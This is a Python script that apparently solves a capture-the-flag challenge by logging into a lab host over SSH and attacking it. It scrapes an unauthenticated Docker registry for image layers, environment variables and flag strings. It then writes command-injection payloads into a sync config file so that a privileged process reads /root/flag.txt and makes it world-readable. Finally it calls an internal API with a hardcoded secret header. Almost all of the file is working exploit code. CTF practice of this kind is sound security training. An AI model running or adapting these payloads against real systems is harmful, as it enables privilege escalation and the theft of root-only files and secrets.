#!/usr/bin/env python3
import paramiko, time, json

HOST, PORT, USER, PW = "instance.ctf.tdho.st", 33039, "player", "reyalp"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, port=PORT, username=USER, password=PW, timeout=12)

def cmd(c, t=15):
    i, o, e = ssh.exec_command(c, timeout=t)
    return (o.read() + e.read()).decode(errors="replace")

print("=== CONNECTED ===")
print(cmd("id; hostname; ip -4 addr 2>/dev/null || ip addr | grep inet"))

for p in [
    "/opt/mc/.sync/sync.result",
    "/opt/mc/config/sync-result.conf",
    "/tmp/flag.txt",
    "/root/flag.txt",
]:
    r = cmd(f"cat {p} 2>&1")
    if r.strip() and "No such" not in r and "denied" not in r.lower():
        print(f"FLAG PATH {p}:", r)

print("=== PROCS ===")
print(cmd("ps aux | grep sync | grep -v grep"))
print(cmd("ps aux | grep watch | grep -v grep"))

print("=== CONFIG ===")
print(cmd("ls -la /opt/mc/config/ /opt/mc/.sync/ 2>&1"))
print(cmd("cat /opt/mc/config/sync-request.conf 2>/dev/null"))

reg = None
for ip in ["172.27.0.1", "172.31.0.1", "172.17.0.1"]:
    r = cmd(f"curl -s -m 2 http://{ip}:5000/v2/_catalog")
    if "repositories" in r:
        reg = f"http://{ip}:5000"
        print("REGISTRY:", reg, r[:800])
        break

if reg:
    repos = json.loads(cmd(f"curl -s {reg}/v2/_catalog"))["repositories"]
    for repo in repos:
        tags = json.loads(cmd(f"curl -s {reg}/v2/{repo}/tags/list")).get("tags", [])
        print(f"  {repo}: {tags}")

    extract = f"""python3 << 'PYEOF'
import urllib.request, json, gzip, tarfile, io
reg = "{reg}"
repos = {json.dumps(repos)}
targets = ["sync-loop.sh", "sync-agent.sh", "watcher.sh"]
for repo in repos:
    try:
        tags = json.loads(urllib.request.urlopen(reg+"/v2/"+repo+"/tags/list", timeout=3).read()).get("tags") or []
    except Exception as ex:
        continue
    for tag in tags:
        img = repo+":"+tag
        try:
            req = urllib.request.Request(
                reg+"/v2/"+repo+"/manifests/"+tag,
                headers={{"Accept":"application/vnd.docker.distribution.manifest.v2+json"}}
            )
            m = json.loads(urllib.request.urlopen(req, timeout=5).read())
        except Exception:
            continue
        for layer in m.get("layers", []):
            try:
                data = urllib.request.urlopen(reg+"/v2/"+repo+"/blobs/"+layer["digest"], timeout=8).read()
            except Exception:
                continue
            tf = None
            for opener in [
                lambda d: tarfile.open(fileobj=io.BytesIO(d), mode="r:*"),
                lambda d: tarfile.open(fileobj=io.BytesIO(gzip.decompress(d)), mode="r:*"),
            ]:
                try:
                    tf = opener(data)
                    break
                except Exception:
                    pass
            if not tf:
                continue
            for member in tf.getmembers():
                if not member.isfile():
                    continue
                if any(t in member.name for t in targets):
                    print("\\n===", img, member.name, "===\\n")
                    print(tf.extractfile(member).read().decode(errors="replace")[:12000])
                else:
                    try:
                        content = tf.extractfile(member).read()
                    except Exception:
                        continue
                    if b"tdho{{" in content or b"Kaal{{" in content:
                        print("\\nFLAG HIT", img, member.name)
                        print(content[:2000].decode(errors="replace"))
        if "config" in m:
            try:
                cfg = json.loads(urllib.request.urlopen(reg+"/v2/"+repo+"/blobs/"+m["config"]["digest"], timeout=5).read())
                env = cfg.get("config", {{}}).get("Env", [])
                if env:
                    print("\\nENV", img, env)
            except Exception:
                pass
PYEOF"""
    print(cmd(extract, 90))

payloads = [
    "talldwarf-sync-force=true",
    "talldwarf-sync=true",
    "talldwarf-sync-command=cat /root/flag.txt > /tmp/f && chmod 777 /tmp/f",
    "talldwarf-sync-command=cp /opt/mc/.sync/sync.result /opt/mc/config/sync-result.conf && chown player:player /opt/mc/config/sync-result.conf",
]
for pl in payloads:
    cmd(f'echo "{pl}" > /opt/mc/config/sync-request.conf')
    time.sleep(8)
    for check in ["/tmp/f", "/opt/mc/config/sync-result.conf", "/opt/mc/.sync/sync.result"]:
        r = cmd(f"cat {check} 2>/dev/null")
        if r.strip() and ("tdho" in r or "Kaal" in r or "FLAG=" in r):
            print("SUCCESS", pl, check, r)

print("=== API ===")
print(cmd("curl -s -m 3 http://172.27.0.1:8080/sync/result"))
print(cmd('curl -s -m 3 -H "X-Secret: dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ" http://172.27.0.1:8080/sync/result'))

print("=== GREP ===")
print(cmd("grep -r 'tdho{' /opt /tmp 2>/dev/null | head -5"))

ssh.close()
print("DONE")
